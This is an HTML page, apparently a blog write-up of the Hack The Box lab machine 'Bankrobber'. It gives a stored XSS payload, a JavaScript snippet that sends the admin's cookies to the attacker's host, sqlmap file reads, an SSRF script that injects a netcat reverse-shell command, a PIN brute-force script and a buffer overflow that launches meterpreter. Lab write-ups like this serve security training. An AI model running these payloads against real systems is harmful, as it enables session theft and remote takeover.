@@ -1,0 +1,786 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Bankrobber - Hack The Box - hackcommander.io</title>
+<meta name="description" content="Bankrobber is a web app box with a simple XSS and SQL injection that we have to exploit in order to get the source code of the application and discover a command injection vulnerability in the backdoor checker page that’s only reachable from localhost. By using the XSS to make a local request to that page, we can get land a shell on the box. To get root, we exploit a buffer in an application to override the name of the binary launched by the program.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="hackcommander.io">
+<meta property="og:title" content="Bankrobber - Hack The Box">
+<meta property="og:url" content="http://localhost:4000/htb-writeup-bankrobber/">
+
+
+  <meta property="og:description" content="Bankrobber is a web app box with a simple XSS and SQL injection that we have to exploit in order to get the source code of the application and discover a command injection vulnerability in the backdoor checker page that’s only reachable from localhost. By using the XSS to make a local request to that page, we can get land a shell on the box. To get root, we exploit a buffer in an application to override the name of the binary launched by the program.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-bankrobber/bankrobber_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2020-03-07T00:00:00+01:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-writeup-bankrobber/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "HackCommander",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Bankrobber - Hack The Box</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">HackCommander</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, Bug Bounty Hunter <br>and CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/iván-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Bankrobber - Hack The Box">
+    <meta itemprop="description" content="Bankrobber is a web app box with a simple XSS and SQL injection that we have to exploit in order to get the source code of the application and discover a command injection vulnerability in the backdoor checker page that’s only reachable from localhost. By using the XSS to make a local request to that page, we can get land a shell on the box. To get root, we exploit a buffer in an application to override the name of the binary launched by the program.">
+    <meta itemprop="datePublished" content="March 07, 2020">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Bankrobber - Hack The Box
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2020-03-07T00:00:00+01:00">March 07, 2020 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-writeup-bankrobber/bankrobber_logo.png" alt="" /></p>
+
+<p>Bankrobber is a web app box with a simple XSS and SQL injection that we have to exploit in order to get the source code of the application and discover a command injection vulnerability in the backdoor checker page that’s only reachable from localhost. By using the XSS to make a local request to that page, we can get land a shell on the box. To get root, we exploit a buffer in an application to override the name of the binary launched by the program.</p>
+
+<h2 id="summary">Summary</h2>
+
+<ul>
+  <li>The Transfer E-coin form contains an XSS vulnerability in the comment field</li>
+  <li>We can grab the administrator username and password and then log in to the site</li>
+  <li>There’s an SQL injection in the “Search users” function which we can use to dump the database and read files from the box</li>
+  <li>Using the XSS, we can turn it into an SSRF and get access to the “Backdoorchecker” page which is only accessible by the localhost</li>
+  <li>After getting the Backdoorchecker source code with the SQLi, we find a command injection vulnerability</li>
+  <li>Using the injection vulnerability, we can pop a shell with netcat and get the first flag</li>
+  <li>There’s a custom binary running a banking app on port 910 which we bruteforce to get the PIN</li>
+  <li>Once we have the PIN, we exploit a buffer overflow to execute an arbitrary program and get a shell as root</li>
+</ul>
+
+<h2 id="portscan">Portscan</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/htb/bankrobber# nmap -T4 -sC -sV -p- 10.10.10.154
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-21 15:01 EDT
+Nmap scan report for bankrobber.htb (10.10.10.154)
+Host is up (0.052s latency).
+Not shown: 65531 filtered ports
+PORT     STATE SERVICE      VERSION
+80/tcp   open  http         Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
+|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
+|_http-title: E-coin
+443/tcp  open  ssl/http     Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
+|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
+|_http-title: E-coin
+| ssl-cert: Subject: commonName=localhost
+| Not valid before: 2009-11-10T23:48:47
+|_Not valid after:  2019-11-08T23:48:47
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn:
+|_  http/1.1
+445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+3306/tcp open  mysql        MariaDB (unauthorized)
+Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1h00m06s, deviation: 0s, median: 1h00m06s
+|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
+| smb-security-mode:
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2019-09-21T20:03:12
+|_  start_date: 2019-09-21T20:00:52
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 144.62 seconds
+</code></pre></div></div>
+
+<h2 id="smb">SMB</h2>
+
+<p>SMB is not reachable through null or guest sessions:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/htb/bankrobber# smbmap -u invalid -H 10.10.10.154
+[+] Finding open SMB ports....
+[!] Authentication error occured
+[!] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[!] Authentication error on 10.10.10.154
+root@kali:~/htb/bankrobber# smbmap -u '' -H 10.10.10.154
+[+] Finding open SMB ports....
+[!] Authentication error occured
+[!] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
+[!] Authentication error on 10.10.10.154
+</code></pre></div></div>
+
+<h2 id="mysql">MySQL</h2>
+
+<p>MySQL is not accessible remotely:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/htb/bankrobber# mysql -h 10.10.10.154 -u root -p
+Enter password:
+
+ERROR 1130 (HY000): Host '10.10.14.19' is not allowed to connect to this MariaDB server
+</code></pre></div></div>
+
+<h2 id="web-enumeration">Web enumeration</h2>
+
+<p>The website is a web application that allows users to buy E-coin cryptocurrency.</p>
+
+<p><img src="/assets/images/htb-writeup-bankrobber/web1.png" alt="" /></p>
+
+<p>I can create an account by following the Register link.</p>
+
+<p><img src="/assets/images/htb-writeup-bankrobber/web2.png" alt="" /></p>
+
+<p>After logging in I have the option of transferring funds to another user and to leave a comment.</p>
+
+<p><img src="/assets/images/htb-writeup-bankrobber/web3.png" alt="" /></p>
+
+<p>When I transfer funds, I get a popup message saying the admin will review the transaction. This screams XSS to me because there’s a comment field that the admin will see and if it’s not sanitized correctly I’ll be able to inject javascript code in his browser session.</p>
+
+<p><img src="/assets/images/htb-writeup-bankrobber/web4.png" alt="" /></p>
+
+<h2 id="exploiting-the-xss">Exploiting the XSS</h2>
+
+<p>My XSS payload in the comments field is very simple: <code class="language-plaintext highlighter-rouge">&lt;script src="http://10.10.14.19/xss.js"&gt;&lt;/script&gt;</code></p>
+
+<p>This’ll make the admin browser download a javascript file from my machine and execute its code.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">xss.js</code> will steal the session cookies from the admin and send them to my webserver.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">pwn</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">img</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">img</span><span class="dl">"</span><span class="p">);</span>
+    <span class="nx">img</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://10.10.14.19/xss?=</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">img</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="nx">pwn</span><span class="p">();</span>
+</code></pre></div></div>
+
+<p>After a few minutes I get two connections. The first downloads the javascript payload and the second one is the connection from the script with the admin cookies.</p>
+
+<p><img src="/assets/images/htb-writeup-bankrobber/xss1.png" alt="" /></p>
+
+<p>The cookies contains the admin’s username and password Base64 encoded:</p>
+
+<ul>
+  <li>Username: <code class="language-plaintext highlighter-rouge">admin</code></li>
+  <li>Password: <code class="language-plaintext highlighter-rouge">Hopelessromantic</code></li>
+</ul>
+
+<h2 id="exploiting-the-sqli">Exploiting the SQLi</h2>
+
+<p>Once logged in as administrator, I see that there’s a list of transactions, a search function for users and a backdoorchecker.</p>
+
+<p><img src="/assets/images/htb-writeup-bankrobber/web5.png" alt="" /></p>
+
+<p>The backdoorchecker is only accessible from the localhost because it returns the following message when I try any commands: <code class="language-plaintext highlighter-rouge">It's only allowed to access this function from localhost (::1). This is due to the recent hack attempts on our server.</code></p>
+
+<p>The search function contains an obvious SQL injection since I get the following error after sending a single quote: <code class="language-plaintext highlighter-rouge">There is a problem with your SQL syntax</code></p>
+
+<p>This should be easy to exploit with sqlmap.</p>
+
+<p>I’ll save one of the POST request from the search field in a <code class="language-plaintext highlighter-rouge">search.req</code> file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /admin/search.php HTTP/1.1
+Host: bankrobber.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://bankrobber.htb/admin/
+Content-type: application/x-www-form-urlencoded
+Content-Length: 6
+Cookie: id=1; username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D
+Connection: close
+</code></pre></div></div>
+
+<p>Then I run <code class="language-plaintext highlighter-rouge">sqlmap -r search.req</code> to start testing for injection points. As expected it quickly finds the injection point:</p>
+
+<p><img src="/assets/images/htb-writeup-bankrobber/sql1.png" alt="" /></p>
+
+<h2 id="exploring-with-sqlmap">Exploring with sqlmap</h2>
+
+<p>First I’ll check which user the webapp is running as on the MySQL server: <code class="language-plaintext highlighter-rouge">sqlmap -r search.req --current-user</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>current user: 'root@localhost'
+</code></pre></div></div>
+
+<p>I’m root so I should be able to get the passwords hashes with: <code class="language-plaintext highlighter-rouge">sqlmap -r search.req --passwords</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] pma [1]:
+    password hash: NULL
+[*] root [1]:
+    password hash: *F435725A173757E57BD36B09048B8B610FF4D0C4
+</code></pre></div></div>
+
+<p>A quick search online shows the password for this hash is: <code class="language-plaintext highlighter-rouge">Welkom1!</code></p>
+
+<p><img src="/assets/images/htb-writeup-bankrobber/hash1.png" alt="" /></p>
+
+<p>Nice but that doesn’t really help me for now. Next I’ll get the source code of various PHP files in the web app. This is a Windows box running Apache and PHP so I’m probably looking at a XAMPP stack. A quick search online shows the default base directory for XAMPP is: <code class="language-plaintext highlighter-rouge">C:/xampp/htdocs</code></p>
+
+<p>I can use the <code class="language-plaintext highlighter-rouge">--file-read</code> flag in sqlmap to read files:</p>
+
+<p><code class="language-plaintext highlighter-rouge">sqlmap -r search.req --file-read '/xampp/htdocs/index.php'</code>
+<code class="language-plaintext highlighter-rouge">sqlmap -r search.req --file-read '/xampp/htdocs/admin/search.php'</code>
+<code class="language-plaintext highlighter-rouge">sqlmap -r search.req --file-read '/xampp/htdocs/admin/backdoorchecker.php'</code></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">backdoorchecker.php</code> is interesting because it contains an injection vulnerability in the system() function. There’s some filtering done on the provided <code class="language-plaintext highlighter-rouge">cmd</code> parameter: it has to start with <code class="language-plaintext highlighter-rouge">dir</code> and can’t contain <code class="language-plaintext highlighter-rouge">$(</code> or <code class="language-plaintext highlighter-rouge">&amp;</code>. But that’s not enough to prevent injecting commands. Source code shown below:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">include</span><span class="p">(</span><span class="s1">'../link.php'</span><span class="p">);</span>
+<span class="k">include</span><span class="p">(</span><span class="s1">'auth.php'</span><span class="p">);</span>
+
+<span class="nv">$username</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nb">urldecode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]));</span>
+<span class="nv">$password</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nb">urldecode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]));</span>
+<span class="nv">$bad</span> 	  <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'$('</span><span class="p">,</span><span class="s1">'&amp;'</span><span class="p">);</span>
+<span class="nv">$good</span> 	  <span class="o">=</span> <span class="s2">"ls"</span><span class="p">;</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="kc">PHP_OS</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">))</span> <span class="o">==</span> <span class="s2">"win"</span><span class="p">){</span>
+    <span class="nv">$good</span> <span class="o">=</span> <span class="s2">"dir"</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nv">$username</span> <span class="o">==</span> <span class="s2">"admin"</span> <span class="o">&amp;&amp;</span> <span class="nv">$password</span> <span class="o">==</span> <span class="s2">"Hopelessromantic"</span><span class="p">){</span>
+    <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])){</span>
+        <span class="c1">// FILTER ESCAPE CHARS</span>
+        <span class="k">foreach</span><span class="p">(</span><span class="nv">$bad</span> <span class="k">as</span> <span class="nv">$char</span><span class="p">){</span>
+            <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">],</span><span class="nv">$char</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">){</span>
+                <span class="k">die</span><span class="p">(</span><span class="s2">"You're not allowed to do that."</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="c1">// CHECK IF THE FIRST 2 CHARS ARE LS</span>
+        <span class="k">if</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$good</span><span class="p">))</span> <span class="o">!=</span> <span class="nv">$good</span><span class="p">){</span>
+            <span class="k">die</span><span class="p">(</span><span class="s2">"It's only allowed to use the </span><span class="nv">$good</span><span class="s2"> command"</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"::1"</span><span class="p">){</span>
+            <span class="nb">system</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
+        <span class="p">}</span> <span class="k">else</span><span class="p">{</span>
+            <span class="k">echo</span> <span class="s2">"It's only allowed to access this function from localhost (::1).&lt;br&gt; This is due to the recent hack attempts on our server."</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span> <span class="k">else</span><span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"You are not allowed to use this function!"</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<h2 id="turning-the-xss-into-an-ssrf">Turning the XSS into an SSRF</h2>
+
+<p>As I found earlier I can’t reach the <code class="language-plaintext highlighter-rouge">backdoorchecker.php</code> file from my own machine but I can use the same XSS to turn it into a SSRF. I’ll need to change my javascript payload to generate a POST request to the backdoor checker page with the right parameters. After some trial an error I found that <code class="language-plaintext highlighter-rouge">dir|\\\\10.10.14.19\\test\\nc.exe 10.10.14.19 7000 -e cmd.exe"</code> payload works to execute netcat over SMB and get a shell.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">pwn</span><span class="p">()</span> <span class="p">{</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">id=1; username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D</span><span class="dl">"</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">uri</span> <span class="o">=</span><span class="dl">"</span><span class="s2">/admin/backdoorchecker.php</span><span class="dl">"</span><span class="p">;</span>
+    <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+    <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="nx">uri</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+    <span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>
+    <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">cmd=dir|</span><span class="se">\\\\</span><span class="s2">10.10.14.19</span><span class="se">\\</span><span class="s2">test</span><span class="se">\\</span><span class="s2">nc.exe 10.10.14.19 7000 -e cmd.exe</span><span class="dl">"</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="nx">pwn</span><span class="p">();</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-bankrobber/shell1.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\xampp\htdocs\admin&gt;type c:\users\cortin\desktop\user.txt
+f6353466...
+</code></pre></div></div>
+
+<h2 id="privesc-using-bank-transfer-application">Privesc using bank transfer application</h2>
+
+<p>There’s something odd running on port 910…</p>
+
+<p><img src="/assets/images/htb-writeup-bankrobber/root1.png" alt="" /></p>
+
+<p>I also see a <code class="language-plaintext highlighter-rouge">bankv2.exe</code> file in the system root directory but I can’t read it.</p>
+
+<p><img src="/assets/images/htb-writeup-bankrobber/root2.png" alt="" /></p>
+
+<p>I generated an metasploit reverse shell payload, uploaded it then created a port forward for this port:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; portfwd add -l 910 -p 910 -r 127.0.0.1
+[*] Local TCP relay created: :910 &lt;-&gt; 127.0.0.1:910
+</code></pre></div></div>
+
+<p>I can reach the application now on port 910 but I don’t have a valid PIN:</p>
+
+<p><img src="/assets/images/htb-writeup-bankrobber/root3.png" alt="" /></p>
+
+<p>I tried checking for buffer overflows but couldn’t crash the program so I likely have to brute force the PIN first. I made a quick script to brute force the PIN:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">i</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+<span class="n">j</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">m</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="k">if</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">j</span><span class="p">:</span>
+        <span class="n">pin</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">).</span><span class="n">zfill</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="mi">910</span><span class="p">)</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"[$]"</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">)</span>
+            <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"%s"</span> <span class="o">%</span> <span class="n">pin</span><span class="p">)</span>
+        <span class="k">except</span> <span class="nb">EOFError</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">"Retry on %d"</span> <span class="o">%</span> <span class="n">i</span><span class="p">)</span>
+            <span class="k">continue</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">m</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+            <span class="k">print</span> <span class="n">m</span>
+        <span class="k">except</span> <span class="nb">EOFError</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">"Retry on %d"</span> <span class="o">%</span> <span class="n">i</span><span class="p">)</span>
+            <span class="k">continue</span>
+        <span class="k">if</span> <span class="s">"Access denied, disconnecting client"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">m</span><span class="p">:</span>
+            <span class="k">print</span> <span class="n">m</span>
+            <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+        <span class="k">print</span> <span class="s">"Doing ... "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+        <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"We're done."</span><span class="p">)</span>
+        <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Thankfully the PIN was a low number so I didn’t have to search the entire PIN space: <code class="language-plaintext highlighter-rouge">0021</code></p>
+
+<p><img src="/assets/images/htb-writeup-bankrobber/brute.png" alt="" /></p>
+
+<p>When I log in with the PIN, I can transfer coins and I see that the <code class="language-plaintext highlighter-rouge">transfer.exe</code> command is executed:</p>
+
+<p><img src="/assets/images/htb-writeup-bankrobber/bof1.png" alt="" /></p>
+
+<p>If I send a large string I can see there’s a buffer overflow present in the program since I no longer see the <code class="language-plaintext highlighter-rouge">transfer.exe</code> and it’s replaced by some characters that submitted in the amount field.</p>
+
+<p><img src="/assets/images/htb-writeup-bankrobber/bof2.png" alt="" /></p>
+
+<p>The offset is 32 bytes as shown below:</p>
+
+<p><img src="/assets/images/htb-writeup-bankrobber/bof3.png" alt="" /></p>
+
+<p>Note that whatever is overflowing from the amount variable gets into the name of the program that is executed after. So I can simply replace the executed program by a meterpreter payload I uploaded:</p>
+
+<p><img src="/assets/images/htb-writeup-bankrobber/bof4.png" alt="" /></p>
+
+<p>My meterpreter gets executed and I get a shell as NT AUTHORITY\SYSTEM</p>
+
+<p><img src="/assets/images/htb-writeup-bankrobber/bof5.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; cat /users/admin/desktop/root.txt
+aa65d8e...
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
